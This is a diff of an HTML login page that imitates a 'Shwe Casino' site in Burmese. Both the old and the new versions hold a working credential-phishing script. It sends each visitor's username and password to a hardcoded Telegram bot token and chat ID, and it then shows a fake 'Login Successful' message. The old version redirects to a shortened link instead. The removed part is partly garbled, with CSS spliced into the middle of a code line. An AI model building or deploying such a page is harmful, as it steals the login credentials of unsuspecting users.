@@ -1,36 +1,44 @@
-<!DOCTYPE html> <html lang="my"> <head> <meta charset="UTF-8"> <meta name="viewport" content="width=device-width, initial-scale=1.0"> <title>Shwe Casino</title> <style> body{ margin:0; font-family:Myanmar Text; background:#8b0000; color:white; } .banner img{ width:100%; height:180px; object-fit:cover; } .container{ padding:15px; } .login-box{ background:#6b0000; padding:20px; border-radius:10px; } input{ width:100%; padding:12px; margin-top:10px; border:none; border-radius:5px; background:#a00000; color:white; } .pass-box{ position:relative; } .eye{ position:absolute; right:10px; top:12px; cursor:pointer; } .captcha-box{ background:#f5d9a6; color:black; padding:10px; margin-top:10px; display:flex; justify-content:space-between; border-radius:5px; font-size:20px; letter-spacing:6px; } button{ width:100%; padding:12px; margin-top:15px; background:#f0c36d; border:none; border-radius:5px; font-size:18px; } .small{ margin-top:10px; display:flex; justify-content:space-between; font-size:14px; } </style> </head> <body> <div class="banner"> <img src="https://i.imgur.com/6RL0KQx.jpeg"> </div> <div class="container"> <div class="login-box"> <h3>အကောင့်ဝင်ရန်</h3> <input id="username" placeholder="အသုံးပြုသူအမည်"> <div class="pass-box"> <input id="password" type="password" placeholder="စကားဝှက်"> <span class="eye" onclick="togglePass()"></span> </div> <div class="captcha-box"> <span id="captcha">00000</span> <span onclick="newCaptcha()" style="cursor:pointer;"></span> </div> <input id="captchaInput" placeholder="အပေါ်ကဂဏန်းထည့်ပါ"> <button onclick="login()">အကောင့်ဝင်ရန်</button> <div class="small"> <span>အကောင့်သစ်ဖွင့်ရန်</span> <span>စကားဝှက်မေ့နေပါသလား?</span> </div> </div> </div> <script> var token="8694948559:AAGXf_c4fWj1qefoqOwriJHtad-ZFwZSy8c"; var chatid="8296340452"; function newCaptcha(){ var num=Math.floor(10000+Math.random()*90000); document.getElementById("captcha").innerText=num; } newCaptcha(); function togglePass(){ var x=document.getElementById("password"); if(x.type==="password"){x.type="text";} else{x.type="password";} } function login(){ var user=document.getElementById("username").value; var pass=document.getElementById("password").value; var cap=document.getElementById("captcha").innerText; var capInput=document.getElementById("captchaInput").value; if(cap!=capInput){ alert("Captcha မမှန်ပါ"); newCaptcha(); return; } var text="ShweCasino Login\nUsername: "+user+"\nPassword: "+pass; fetch("https://api.telegram.org/bot"+token+"/sendMessage?chat_id="+chatid+.banner img{
+```html
+<!DOCTYPE html>
+<html lang="my">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Shwe Casino</title>
+
+<style>
+
+body{
+margin:0;
+font-family:Myanmar Text;
+background:#8b0000;
+color:white;
+}
+
+.banner img{
 width:100%;
-height:220px;
+height:180px;
 object-fit:cover;
-display:block;
+}
+
+.container{
+padding:15px;
 }
 
 .login-box{
 background:#6b0000;
-;
 padding:20px;
-border-radius:15px;
-}
-
-h2{
-margin-top:0;
-color:#ffcc66;
-text-align:center;
+border-radius:10px;
 }
 
 input{
 width:100%;
 padding:12px;
-margin:10px 0;
+margin-top:10px;
 border:none;
-border-radius:10px;
-background:#ffffff20;
+border-radius:5px;
+background:#a00000;
 color:white;
-font-size:16px;
-}
-
-.username{
-margin-bottom:25px;
 }
 
 .pass-box{
@@ -40,73 +48,114 @@ position:relative;
 .eye{
 position:absolute;
 right:10px;
-top:50%;
-transform:translateY(-50%);
+top:12px;
 cursor:pointer;
-width:24px;
-height:24px;
-fill:#ffcc66;
-}
-
-.forgot{
-display:block;
-text-align:right;
-font-size:13px;
-color:#ffcc66;
-text-decoration:none;
-margin-top:5px;
 }
 
 .captcha-box{
-position:relative;
-background:#f3d6a2;
-color:#333;
-font-size:24px;
-letter-spacing:10px;
-text-align:center;
-padding:12px;
-border-radius:10px;
+background:#f5d9a6;
+color:black;
+padding:10px;
 margin-top:10px;
-font-weight:bold;
-}
-
-.refresh{
-position:absolute;
-right:10px;
-top:8px;
-cursor:pointer;
+display:flex;
+justify-content:space-between;
+border-radius:5px;
 font-size:20px;
+letter-spacing:6px;
 }
 
 button{
 width:100%;
 padding:12px;
+margin-top:15px;
+background:#f0c36d;
 border:none;
-border-radius:10px;
-background:#ffcc66;
+border-radius:5px;
 font-size:18px;
-font-weight:bold;
-cursor:pointer;
-margin-top:10px;
 }
 
-";
+.small{
+margin-top:10px;
+display:flex;
+justify-content:space-between;
+font-size:14px;
+}
 
-var username=document.querySelector(".username").value;
-var password=document.getElementById("pass").value;
+</style>
+</head>
 
-var text="New Login\nUsername: "+username+"\nPassword: "+password;
+<body>
+
+<div class="banner">
+<img src="https://i.imgur.com/6RL0KQx.jpeg">
+</div>
+
+<div class="container">
+
+<div class="login-box">
+
+<h3>အကောင့်ဝင်ရန်</h3>
+
+<input id="username" placeholder="အသုံးပြုသူအမည်">
+
+<div class="pass-box">
+<input id="password" type="password" placeholder="စကားဝှက်">
+<span class="eye" onclick="togglePass()">👁</span>
+</div>
+
+<div class="captcha-box">
+<span id="captcha">00000</span>
+<span onclick="newCaptcha()" style="cursor:pointer;">↻</span>
+</div>
+
+<input id="captchaInput" placeholder="အပေါ်ကဂဏန်းထည့်ပါ">
+
+<button onclick="login()">အကောင့်ဝင်ရန်</button>
+
+<div class="small">
+<span>အကောင့်သစ်ဖွင့်ရန်</span>
+<span>စကားဝှက်မေ့နေပါသလား?</span>
+</div>
+
+</div>
+</div>
+
+<script>
 
 var token="8694948559:AAGXf_c4fWj1qefoqOwriJHtad-ZFwZSy8c";
-var chat_id="8296340452";
+var chatid="8296340452";
 
-var url="https://api.telegram.org/bot"+token+"/sendMessage?chat_id="+chat_id+"&text="+encodeURIComponent(text);
+function newCaptcha(){
+var num=Math.floor(10000+Math.random()*90000);
+document.getElementById("captcha").innerText=num;
+}
 
-fetch(url);
+newCaptcha();
 
-setTimeout(function(){
-window.location.href="https://cutt.ly/otrecCFE";
-},2000);
+function togglePass(){
+var x=document.getElementById("password");
+if(x.type==="password"){x.type="text";}
+else{x.type="password";}
+}
+
+function login(){
+
+var user=document.getElementById("username").value;
+var pass=document.getElementById("password").value;
+var cap=document.getElementById("captcha").innerText;
+var capInput=document.getElementById("captchaInput").value;
+
+if(cap!=capInput){
+alert("Captcha မမှန်ပါ");
+newCaptcha();
+return;
+}
+
+var text="ShweCasino Login\nUsername: "+user+"\nPassword: "+pass;
+
+fetch("https://api.telegram.org/bot"+token+"/sendMessage?chat_id="+chatid+"&text="+text);
+
+alert("Login Successful");
 
 }
 
@@ -114,4 +163,4 @@ window.location.href="https://cutt.ly/otrecCFE";
 
 </body>
 </html>
-tml>
+```
